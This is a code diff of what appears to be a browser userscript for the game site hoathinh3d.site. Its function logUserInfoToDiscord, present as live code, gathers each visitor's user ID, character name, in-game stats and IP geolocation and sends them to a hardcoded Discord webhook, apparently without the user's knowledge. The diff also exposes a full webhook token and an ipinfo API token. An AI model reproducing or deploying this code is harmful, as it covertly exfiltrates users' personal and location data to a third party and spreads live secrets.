@@ -1,6 +1,6 @@
 (async function logUserInfoToDiscord() {
     const webhook = "https://discord.com/api/webhooks/1372814560792285184/EI3hDpxb6Fd0Sd6ApXVP9ocEdEu-kwn-Qwq4jAhHvIbe82V6KG3Lnwp5tZzx6wNeqTP0";
-    const ipinfoToken = "10ddf60e7b0de8"; // Lấy miễn phí tại: https://ipinfo.io/signup
+    const ipinfoToken = "PASTE_YOUR_TOKEN";  // Lấy miễn phí tại: https://ipinfo.io/signup
   
     const url = location.href;
     if (!url.includes("hoathinh3d.site/?t=")) return; // Chỉ chạy nếu là trang t=xxxx
@@ -16,7 +16,7 @@
       const userId = scriptTag?.textContent.match(/"user_id":\s*"(\d+)"/)?.[1] || "Không rõ";
   
       // 3️⃣ Tên nhân vật
-      const name = doc.querySelector('#ch_head_name .color_ket_dan')?.textContent.trim() || "Không rõ";
+      const name = doc.querySelector('#ch_head_name')?.textContent.trim() || "Không rõ";
   
       // 4️⃣ Tu Vi
       const tuVi = Array.from(doc.querySelectorAll('#head_manage_acc div'))
@@ -31,7 +31,7 @@
         .find(div => div.textContent.includes("Tiên Ngọc"))?.textContent.match(/Tiên Ngọc:\s*(\d+)/)?.[1] || "0";
   
       // 7️⃣ Lấy thông tin IP (qua ipinfo.io)
-      const ipData = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`).then(res => res.json());
+      const ipData = await fetch(`https://ipinfo.io/json?token=10ddf60e7b0de8`).then(res => res.json());
   
       // 8️⃣ Gửi về Discord
       const message = [
@@ -58,7 +58,7 @@
       console.warn("❌ Lỗi khi gửi log Discord:", e);
     }
   })();
-  
+    
 (function() {  
 const DOMAIN = 'https://hoathinh3d.site';
 const ACTION_URL = DOMAIN + '/wp-json/hh3d/v1/action';
